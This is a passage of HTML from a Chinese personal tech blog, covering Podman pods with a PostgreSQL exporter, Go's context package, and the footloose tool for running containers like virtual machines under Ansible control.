5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman run -d --pod postgresql -e POSTGRES_PASSWORD=password postgres:latest <span class="comment"># 运行 postgresql</span></span><br><span class="line">bb00b1087b3e86f5f8915deb9a826875f4a1f063b30ef6eb743c3ad6b155a823</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman run -d --pod postgresql -e DATA_SOURCE_NAME=<span class="string">"postgresql://postgres:password@localhost:5432/postgres?sslmode=disable"</span>  wrouesnel/postgres_exporter <span class="comment"># 运行 postgres exporter</span></span><br><span class="line">f1197be2aa8be6169e0a0cf3b235b951dafdc4e98afe6753c661a9871038c17c</span><br></pre></td></tr></table></figure>
<p>首先我们创建了一个 Pod，端口映射是在 Pod 这个级别配置的，然后在这个 Pod 中，我们创建了两个 container，分别是：postgres 和 postgres_exporter ，其中 postgres_exporter 主要是暴露 metrics 用于 Prometheus 抓取进行监控。</p>
<p>我们可以通过 curl 相应端口来验证是否正常工作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">iran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a              </span><br><span class="line">CONTAINER ID  IMAGE                                                          COMMAND               CREATED        STATUS            PORTS                                           NAMES</span><br><span class="line">f1197be2aa8b  docker.io/wrouesnel/postgres_exporter:latest                   /postgres_exporte...  4 minutes ago  Up 4 minutes ago                                                  quizzical_mcclintock</span><br><span class="line">bb00b1087b3e  docker.io/library/postgres:latest                              docker-entrypoint...  4 minutes ago  Up 4 minutes ago                                                  kind_spence</span><br><span class="line">5f38e2d70484  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1                        5 minutes ago  Up 5 minutes ago  0.0.0.0:5432-&gt;5432/tcp, 0.0.0.0:9187-&gt;9187/tcp  17020cd16ae6-infra</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics                                                                                                                                 </span><br><span class="line"><span class="comment"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span></span><br><span class="line"><span class="comment"># TYPE go_gc_duration_seconds summary</span></span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.25"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.5"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.75"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"1"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds_sum 0</span><br></pre></td></tr></table></figure>
<p>可以看到已经正确的获取到了相应 metrics 数值，可以通过 <code>podman pod top</code> 来获取当前进程状态：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod top postgresql             </span><br><span class="line">USER                PID   PPID   %CPU    ELAPSED           TTY   TIME   COMMAND</span><br><span class="line">0                   1     0      0.000   6m15.74147022s    ?     0s     /pause </span><br><span class="line">postgres            1     0      0.000   5m45.755275073s   ?     0s     postgres </span><br><span class="line">postgres            51    1      0.000   5m44.755304824s   ?     0s     postgres: checkpointer    </span><br><span class="line">postgres            52    1      0.000   5m44.755329093s   ?     0s     postgres: background writer    </span><br><span class="line">postgres            53    1      0.000   5m44.755350888s   ?     0s     postgres: walwriter    </span><br><span class="line">postgres            54    1      0.000   5m44.75537351s    ?     0s     postgres: logical replication launcher    </span><br><span class="line">postgres_exporter   1     0      0.000   5m34.767207535s   ?     0s     /postgres_exporter</span><br></pre></td></tr></table></figure>
<p>在 Podman 中，可以简单的将 Pod 理解为 docker-compose 中的一组容器，并且可以通过 <code>podman pod start/stop</code> 来控制这组容器的启停：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod stop postgresql                                                                      </span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ls              </span><br><span class="line">POD ID         NAME         STATUS   CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Exited   8 minutes ago   3                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ps </span><br><span class="line">POD ID         NAME         STATUS   CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Exited   8 minutes ago   3                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics</span><br><span class="line">curl: (7) Failed to connect to localhost port 9187: Connection refused</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod start postgresql                                                                                                                                                                            7 ↵</span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics      </span><br><span class="line"><span class="comment"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span></span><br><span class="line"><span class="comment"># TYPE go_gc_duration_seconds summary</span></span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.25"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.5"</span>&#125; 0</span><br></pre></td></tr></table></figure>
<h5 id="k8s-联动"><a href="#k8s-联动" class="headerlink" title="k8s 联动"></a>k8s 联动</h5><p>通过 <code>podman generate</code> 命令可以生成 k8s 可用的 YAML 文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman generate kube postgresql &gt; postgresql.yaml</span><br><span class="line">no matching entries <span class="keyword">in</span> passwd file</span><br></pre></td></tr></table></figure>
<p>嗯，又遇到了一个错误，在 Github 上有看到相关 issue，先忽略吧。</p>
<p>使用 <code>podman play</code> 命令可以直接创建完整的 Pod 及其所拥有的容器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">podman play kube postgresql.yaml</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果从 Docker 迁移过来，有以下几点很纠结：</p>
<ol>
<li>说好的 rootless，但是如果你想要进行端口映射，那么还是要老老实实 sudo 的</li>
<li>虽然 systemd 大法好，但是如果 container 直接被删除了，我要单独的管理 systemd service 配置文件（貌似可以通过 OCI hook 实现</li>
<li>更新真的太快了</li>
<li>…</li>
</ol>
<p>很多同学都在说 <code>学不动了</code>，纠结归纠结，学还是要学的，说不定最后 <strong>真香</strong> 了呢。</p>
<p>上述所有功能示例都可以通过官方 Demo 项目运行：<a href="https://github.com/containers/Demos/blob/master/podman_cli/README.md。" target="_blank" rel="noopener">https://github.com/containers/Demos/blob/master/podman_cli/README.md。</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://podman.io/blogs/" target="_blank" rel="noopener">https://podman.io/blogs/</a></li>
<li><a href="https://podman.io/blogs/2018/10/03/podman-remove-content-homedir.html" target="_blank" rel="noopener">https://podman.io/blogs/2018/10/03/podman-remove-content-homedir.html</a></li>
<li><a href="https://www.redhat.com/sysadmin/rootless-podman" target="_blank" rel="noopener">https://www.redhat.com/sysadmin/rootless-podman</a></li>
<li><a href="https://mkdev.me/en/posts/dockerless-part-3-moving-development-environment-to-containers-with-podman" target="_blank" rel="noopener">https://mkdev.me/en/posts/dockerless-part-3-moving-development-environment-to-containers-with-podman</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/09/30/Golang-context-使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/30/Golang-context-使用/" itemprop="url">Golang context 使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-30T18:33:32+08:00">
                2019-09-30
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/09/30/Golang-context-使用/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/09/30/Golang-context-使用/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前段时间在写 Cluster API Provider 的时候，经常会使用 context 传递参数，当时只是按照其他项目中的方式快速的实现，并没有认真的了解 context 具体包含什么，为了解决什么问题，这次来聊一下。</p>
<p>P.S. 虽然写了一周的 Golang，但是对于标准库有什么还一无所知，找时间应该认真过一遍的。。</p>
<h2 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h2><p>先看定义：</p>
<blockquote>
<p>Package context defines the Context type, which carries deadlines, cancellation signals, and other request-scoped values across API boundaries and between processes.</p>
</blockquote>
<ul>
<li>当一个 goroutine 调用其他 goroutine，随着层级变多，我们想要在外层达到控制的效果</li>
<li>在必要场景下传递 <strong>必需</strong> 的数据</li>
</ul>
<p>其中 <code>Context</code> 这个 interface 中定义了 4 个方法，具体如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">interface</span> &#123;</span><br><span class="line">	Deadline() (deadline time.Time, ok <span class="keyword">bool</span>)</span><br><span class="line">	Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">	Err() error</span><br><span class="line">	Value(key <span class="keyword">interface</span>&#123;&#125;) <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>context</code> 包中实现了4个函数，平时也都是使用这些函数：</p>
<ol>
<li>func WithCancel(parent Context) (ctx Context, cancel CancelFunc) </li>
<li>func WithDeadline(parent Context, d time.Time) (Context, CancelFunc)</li>
<li>func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)</li>
<li>func WithValue(parent Context, key, val interface{}) Context</li>
</ol>
<p>可以看到 Cancel,Deadline,Timeout 都会返回一个 CancelFunc 函数，哪怕我们设定的时间还没到，我们也可以直接使用 CancelFunc 去设置 Context。</p>
<p>在 context 使用上有官方文档，且有很多博主已经写过很详细的博客，这里只是列一个简单的例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// Pass a context with a timeout to tell a blocking function that it</span></span><br><span class="line">	<span class="comment">// should abandon its work after the timeout elapses.</span></span><br><span class="line">	ctx, cancel := context.WithTimeout(context.Background(), <span class="number">200</span>*time.Millisecond)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second): <span class="comment">// 等待 1s</span></span><br><span class="line">		fmt.Println(<span class="string">"overslept"</span>)</span><br><span class="line">	<span class="keyword">case</span> &lt;-ctx.Done():  <span class="comment">// 只有当 Channel 关闭时才会返回非空，也就是到了设定的 Timeout 数值</span></span><br><span class="line">		fmt.Println(ctx.Err()) <span class="comment">// prints "context deadline exceeded"</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>不要把 Context 放到结构体中，以参数传递，在作为参数传递时，需要将其作为第一个参数传递</li>
<li>如果 Context 传递内容不确定，那么可以传递 <code>context.Background()</code> 或 <code>context.TODO()</code>，不要传递 nil</li>
<li>不建议使用 <code>context.Value</code> 传递数据</li>
<li>Context 是通过 <strong>通知</strong> 来达到 <strong>控制</strong> 目的</li>
<li>Context 并非是全局的，只查询自身及父context 的数据，同理在 Cancel 也是一样的</li>
</ol>
<h2 id="（可能存在的）问题"><a href="#（可能存在的）问题" class="headerlink" title="（可能存在的）问题"></a>（可能存在的）问题</h2><p>在搜索过程中，看到<a href="https://faiface.github.io/post/context-should-go-away-go2/" target="_blank" rel="noopener">一篇博客</a>提到了 context 的一些问题：</p>
<ul>
<li>传播性<ul>
<li>当我们有一个包含了100个函数的调用栈，当我们想要通过 context 来达到控制目的时，那么我们需要将 context 作为函数的第一个参数不断的传递下去。</li>
</ul>
</li>
<li>什么时候使用 <code>context.TODO</code> ？</li>
<li>context.Value 不该用<ul>
<li>非静态的</li>
<li>需要在指定功能上使用特定的 key/value</li>
<li>容易发生 key 冲突</li>
</ul>
</li>
<li>效率低下</li>
<li>…</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然上面说了那么多，比如上面提到的不应该用 <code>context.Value</code> ，在 ClusterAPI 中有很多使用 <code>context.Value</code> 传值的地方，该用还是用嘛。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://golang.org/pkg/context/#Background" target="_blank" rel="noopener">https://golang.org/pkg/context/#Background</a></li>
<li><a href="https://www.flysnow.org/2017/05/12/go-in-action-go-context.html" target="_blank" rel="noopener">https://www.flysnow.org/2017/05/12/go-in-action-go-context.html</a></li>
<li><a href="https://deepzz.com/post/golang-context-package-notes.html" target="_blank" rel="noopener">https://deepzz.com/post/golang-context-package-notes.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/34417106" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34417106</a></li>
<li><a href="http://imfox.io/2017/11/28/go-context-note/" target="_blank" rel="noopener">http://imfox.io/2017/11/28/go-context-note/</a></li>
<li><a href="https://faiface.github.io/post/context-should-go-away-go2/" target="_blank" rel="noopener">https://faiface.github.io/post/context-should-go-away-go2/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/09/19/像虚拟机一样运行容器/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/19/像虚拟机一样运行容器/" itemprop="url">像虚拟机一样运行容器</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-19T19:58:57+08:00">
                2019-09-19
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/09/19/像虚拟机一样运行容器/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/09/19/像虚拟机一样运行容器/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>平时看过文章标题比较多的都是说“像容器一样运行虚拟机”，大家都想要有虚拟机的隔离性，又想要容器的便捷性，也有一些开源项目比如 Firecracker 或 KataContainer 在做。今天反过来，来看看如何“像虚拟机一样运行容器”。</p>
<p>为啥要把容器搞得像虚拟机一样呢？我平时用到容器比较多的地方就是在 CI 集成部分，通过 docker 快速搭建环境，进行单元测试或集成测试，测试完成后清理镜像，简单方便。但是在CD 部分，就有一点比较头疼的问题，就是调试。zouquan 同学之前在知乎上提了一个问题：<a href="https://www.zhihu.com/question/333652815" target="_blank" rel="noopener">容器化环境里如何方便的进行debug和测试？</a>，回答中的一个总结很好的描述了这个问题的关键： <strong>虽然我在本地开发，但我的应用就像在 k8s 里一样。</strong></p>
<p>那怎么在容器中开发像是在本地一样呢？肯定不能每次改了代码都走一遍 build,push,deploy 的流程，上面问题的回答中给出的是借助各种工具来达成这样的效果，我不像要用那些奇奇怪怪的工作（学不动了），那么只能想办法把容器搞的跟虚拟机一样了。</p>
<p>最近看到了 weaveworks/footloose 项目，这个项目的简介就是我的最原始的需求：Containers that look like Virtual Machines。先来看看这个项目的示例（开源项目中examples 写的好真是上手快）。</p>
<h2 id="功能示例"><a href="#功能示例" class="headerlink" title="功能示例"></a>功能示例</h2><h3 id="Ansible-远程控制"><a href="#Ansible-远程控制" class="headerlink" title="Ansible 远程控制"></a>Ansible 远程控制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># footloose config create --replicas 1 # 指定 machine 副本数为 1</span></span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose create                     # 创建目标资源</span></span><br><span class="line">INFO[0000] Creating SSH key: cluster-key ...            </span><br><span class="line">INFO[0000] Docker Image: quay.io/footloose/centos7:0.6.1 present locally </span><br><span class="line">INFO[0000] Creating machine: cluster-node0 ...          </span><br><span class="line">INFO[0001] Machine cluster-node0 is already created...  </span><br><span class="line">[root@yiran ansible]<span class="comment"># cat ansible.cfg                      # 在 ansible 配置文件中指定 inventory 及连接参数</span></span><br><span class="line">[defaults]</span><br><span class="line">inventory=inventory.txt</span><br><span class="line">remote_user=root</span><br><span class="line">debug=no</span><br><span class="line"></span><br><span class="line">[privilege_escalation]</span><br><span class="line">become=no</span><br><span class="line"></span><br><span class="line">[root@yiran ansible]<span class="comment"># cat inventory.txt </span></span><br><span class="line">[all]</span><br><span class="line">cluster-node0 ansible_connection=docker                    <span class="comment"># 编写对应 machine 连接方式</span></span><br><span class="line"></span><br><span class="line">[root@yiran ansible]<span class="comment"># ansible -m ping all                  # 验证 ansible 通信</span></span><br><span class="line">cluster-node0 | SUCCESS =&gt; &#123;</span><br><span class="line">    <span class="string">"changed"</span>: <span class="literal">false</span>, </span><br><span class="line">    <span class="string">"ping"</span>: <span class="string">"pong"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，通过 footloose 创建一个 machine（容器），可以支持我们远程连接，通过 Ansible 来控制，那么我们来试试 Ansible Playbook 的效果：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">- name:</span> <span class="string">Install</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">  hosts:</span> <span class="string">cluster-node0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  tasks:</span></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Add</span> <span class="string">epel-release</span> <span class="string">repo</span></span><br><span class="line"><span class="attr">    yum:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">epel-release</span></span><br><span class="line"><span class="attr">      state:</span> <span class="string">latest</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Install</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">    yum:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">      state:</span> <span class="string">latest</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Insert</span> <span class="string">Index</span> <span class="string">Page</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="attr">      content:</span> <span class="string">"welcome to footloose nginx ansible example"</span></span><br><span class="line"><span class="attr">      dest:</span> <span class="string">/usr/share/nginx/html/index.html</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Start</span> <span class="string">NGiNX</span></span><br><span class="line"><span class="attr">    service:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">      state:</span> <span class="string">started</span></span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># ansible-playbook  example1.yml</span></span><br><span class="line"></span><br><span class="line">PLAY [Install nginx] ********************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *********************************</span><br><span class="line">ok: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Add epel-release repo] *******************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Install nginx] ********************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Insert Index Page] ***********************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Start NGiNX] **********************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">PLAY RECAP ************************</span><br><span class="line">cluster-node0              : ok=5    changed=4    unreachable=0    failed=0   </span><br><span class="line"></span><br><span class="line">[root@yiran ansible]<span class="comment"># ansible all -m raw -a 'systemctl status nginx'</span></span><br><span class="line">cluster-node0 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">● nginx.service - The nginx HTTP and reverse proxy server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/nginx.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2019-09-19 08:51:26 UTC; 10s ago</span><br><span class="line">  Process: 437 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 436 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 435 ExecStartPre=/usr/bin/rm -f /run/nginx.pid (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 438 (nginx)</span><br><span class="line">   CGroup: /docker/6b8bd7e41a6a303d5cc023e2c2e576773649e4a5188f4ef15b0ad3079e148b49/system.slice/nginx.service</span><br><span class="line">           ├─438 nginx: master process /usr/sbin/ngin</span><br><span class="line">           ├─439 nginx: worker proces</span><br><span class="line">           ├─440 nginx: worker proces</span><br><span class="line">           ├─441 nginx: worker proces</span><br><span class="line">           └─442 nginx: worker proces</span><br><span class="line"></span><br><span class="line">Sep 19 08:51:26 node0 systemd[1]: Starting The nginx HTTP and reverse proxy server...</span><br><span class="line">Sep 19 08:51:26 node0 nginx[436]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">Sep 19 08:51:26 node0 nginx[436]: nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> is successful</span><br><span class="line">Sep 19 08:51:26 node0 systemd[1]: Started The nginx HTTP and reverse proxy server.</span><br></pre></td></tr></table></figure>
<p>可以执行 Ansible Playbook，那几乎意味着我们可以执行任何操作，我们可以通过 ansible rsync 模块直接将代码同步到容器中，也可以通过 Playbook 在容器中执行一些配置来达到我们对环境的修改，可以说是很方便了。</p>
<h3 id="SSH-连接"><a href="#SSH-连接" class="headerlink" title="SSH 连接"></a>SSH 连接</h3><p>既然可以通过 Ansible 进行控制，那么我们肯定也可以通过 ssh 进行连接，可以通过 footloose 提供的默认命令 <code>footloose ssh</code> ：</p>
